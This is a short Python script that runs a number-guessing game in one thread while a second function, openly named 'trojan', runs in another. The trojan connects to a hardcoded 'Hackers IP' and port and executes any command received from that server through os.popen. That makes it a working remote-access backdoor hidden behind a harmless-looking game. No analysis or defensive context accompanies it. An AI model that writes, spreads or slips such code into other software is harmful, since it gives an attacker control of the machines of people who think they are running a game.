import random
import socket
import threading
import os

def trojan():
    HOST = "192.168.0.29" # Hackers IP
    PORT = 9090
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,PORT))
    
    cmd_mode = False
    
    
    
    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == 'cmdon':
            cmd_mode = True
            client.send("You now have terminal access".encode('utf-8'))
            continue
        if server_command == 'cmdoff':
            cmd_mode = False
        if cmd_mode:
            os.popen(server_command)
        else:
            if server_command == 'hello':
                print('Hello world!')
            if server_command == 'hi':
                print('Hi im Filip')
        
            
        client.send(f"{server_command} was executed".encode('utf-8'))

def game():
    number = random.randint(0,100)
    tries = 1
    done = False
    
    while not done:
        guess = int(input("Enter a guess: "))
        if guess == -1:
            break
        if guess == number:
            done = True
            print("You won!")
        else:
            tries += 1
            if guess > number:
                print("number is smaller")
            else:
                print("number is larger")
            
    print(f"You need {tries} tries")
        
t1 = threading.Thread(target = game)
t2 = threading.Thread(target = trojan)

t1.start()
t2.start()
        